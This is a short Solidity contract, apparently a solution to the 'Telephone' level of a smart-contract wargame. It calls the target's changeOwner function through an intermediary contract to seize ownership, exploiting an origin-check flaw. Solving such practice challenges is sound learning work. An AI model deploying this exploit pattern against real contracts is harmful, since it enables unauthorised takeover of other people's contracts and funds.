// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Telephone.sol";

contract AttackTelephone {
    Telephone public telephone;

    constructor (address _telephone) {
        telephone = Telephone(_telephone);
    }

    function attachChangeOwner(address _owner) public {
        telephone.changeOwner(_owner);
    }
}